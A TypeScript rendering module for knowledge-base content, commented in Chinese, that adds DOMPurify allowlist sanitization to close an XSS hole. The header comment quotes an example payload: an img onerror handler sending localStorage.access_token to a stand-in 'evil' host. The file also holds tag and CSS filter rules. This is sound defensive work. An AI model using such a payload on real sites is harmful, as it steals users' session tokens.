/**
 * 知识库 / 文档正文渲染（t159 抽出，供列表预览、整页详情、编辑页预览共用）。
 *
 * 口径与原来列表页内联实现一致：含 HTML 标签则按 HTML 渲染，否则走极简 Markdown
 * （标题 / 列表 / 行内代码 / 粗斜体 / 链接 / 围栏代码块），不引第三方渲染器。
 *
 * **t188 安全加固**：本函数的结果会被 {@code dangerouslySetInnerHTML} 注入 DOM，而正文来自
 * 普通用户可写的知识库/文档/任务记录。此前 `containsHtmlTag` 命中时**原样返回**，
 * 等于把用户输入当 HTML 执行 —— 任何能写知识库的人都能放
 * `<img src=x onerror="fetch('//evil/?'+localStorage.access_token)">`，
 * 在管理员打开页面的瞬间窃走 JWT（token 存在 localStorage）。
 * 现在所有 HTML 分支都必须先过 DOMPurify 白名单清洗。
 */
import DOMPurify from 'dompurify';

export const containsHtmlTag = (content: string) => /<\/?[a-z][\s\S]*>/i.test(content);
export const escapeHtml = (content: string) =>
  content
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');

/**
 * 富文本白名单：覆盖编辑器（react-quill）会产出的标签，其余一律丢弃。
 * 刻意不含 script/iframe/object/embed/style/svg/math 等可执行或可绕过的标签。
 */
const ALLOWED_TAGS = [
  'p', 'br', 'div', 'span', 'strong', 'b', 'em', 'i', 'u', 's', 'del', 'ins', 'sub', 'sup',
  'code', 'pre', 'blockquote', 'hr',
  'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
  'ul', 'ol', 'li',
  'a', 'img',
  'table', 'thead', 'tbody', 'tr', 'th', 'td',
];

/** 属性白名单：不含任何 on* 事件属性（DOMPurify 默认也会丢弃未列出的属性）。 */
const ALLOWED_ATTR = [
  'href', 'target', 'rel', 'src', 'alt', 'title',
  'width', 'height', 'class', 'style',
  'data-list', 'colspan', 'rowspan',
];

let hooksInstalled = false;

/** 外链统一加 noopener noreferrer，避免反向 tabnabbing；同时剔掉 CSS 里的 url()/expression()。 */
const installHooks = () => {
  if (hooksInstalled || !DOMPurify || typeof DOMPurify.addHook !== 'function') {
    return;
  }
  DOMPurify.addHook('afterSanitizeAttributes', (node) => {
    const element = node as Element;
    if (element.tagName === 'A') {
      element.setAttribute('target', '_blank');
      element.setAttribute('rel', 'noopener noreferrer');
    }
    // DOMPurify 只做 HTML 层清洗，不解析 CSS 值；这里再挡一层：
    // 富文本正文不需要外链资源，`url(...)` 直接丢弃；`expression(...)`/`javascript:` 同属历史攻击面。
    const style = element.getAttribute && element.getAttribute('style');
    if (style && /(url\s*\(|expression\s*\(|javascript:)/i.test(style)) {
      element.removeAttribute('style');
    }
  });
  hooksInstalled = true;
};

/**
 * 清洗一段 HTML（白名单 + 去掉一切事件处理器）。
 * @param html 待清洗 HTML
 * @returns 安全的 HTML 字符串
 */
export const sanitizeRichHtml = (html: string) => {
  if (!html) {
    return '';
  }
  installHooks();
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS,
    ALLOWED_ATTR,
    // 允许 data:image/* 作为图片源（编辑器粘贴截图会产生），但禁止 data:text/html 一类可执行文档
    ALLOW_DATA_ATTR: false,
    FORBID_TAGS: ['script', 'iframe', 'object', 'embed', 'style', 'svg', 'math', 'form', 'input', 'button'],
  }) as unknown as string;
};

const renderInlineMarkdown = (text: string) =>
  escapeHtml(text)
    .replace(/`([^`]+)`/g, '<code>$1</code>')
    .replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>')
    .replace(/\*([^*]+)\*/g, '<em>$1</em>')
    .replace(/\[([^\]]+)\]\((https?:\/\/[^)\s]+)\)/g, '<a href="$2" target="_blank" rel="noreferrer">$1</a>');

export const renderMarkdownToHtml = (markdown: string) => {
  const codeBlocks: string[] = [];
  const placeholderMarkdown = markdown.replace(/```([\s\S]*?)```/g, (_, block: string) => {
    const index = codeBlocks.push(block) - 1;
    return `@@CODE_BLOCK_${index}@@`;
  });
  const lines = placeholderMarkdown.replace(/\r\n/g, '\n').split('\n');
  const htmlParts: string[] = [];
  let listItems: string[] = [];
  const flushList = () => {
    if (listItems.length > 0) {
      htmlParts.push(`<ul>${listItems.map((item) => `<li>${item}</li>`).join('')}</ul>`);
      listItems = [];
    }
  };

  lines.forEach((raw) => {
    const line = raw.trimEnd();
    if (line.startsWith('- ')) {
      listItems.push(renderInlineMarkdown(line.slice(2).trim()));
      return;
    }
    flushList();
    if (!line.trim()) {
      htmlParts.push('<div><br/></div>');
      return;
    }
    if (line.startsWith('### ')) {
      htmlParts.push(`<h3>${renderInlineMarkdown(line.slice(4).trim())}</h3>`);
      return;
    }
    if (line.startsWith('## ')) {
      htmlParts.push(`<h2>${renderInlineMarkdown(line.slice(3).trim())}</h2>`);
      return;
    }
    if (line.startsWith('# ')) {
      htmlParts.push(`<h1>${renderInlineMarkdown(line.slice(2).trim())}</h1>`);
      return;
    }
    htmlParts.push(`<p>${renderInlineMarkdown(line.trim())}</p>`);
  });
  flushList();

  let html = htmlParts.join('');
  codeBlocks.forEach((block, index) => {
    const codeHtml = `<pre style="padding:12px;background:#f6f8fa;border-radius:6px;overflow:auto;"><code>${escapeHtml(block.trim())}</code></pre>`;
    html = html.replace(`@@CODE_BLOCK_${index}@@`, codeHtml);
  });
  return html;
};

export const renderRichContent = (content: string, emptyText: string) => {
  const normalized = (content || '').trim();
  if (!normalized) {
    return `<p>${emptyText}</p>`;
  }
  if (containsHtmlTag(normalized)) {
    // t188：用户可写正文里的 HTML 必须先清洗，再交给 dangerouslySetInnerHTML
    return sanitizeRichHtml(normalized);
  }
  return sanitizeRichHtml(renderMarkdownToHtml(normalized));
};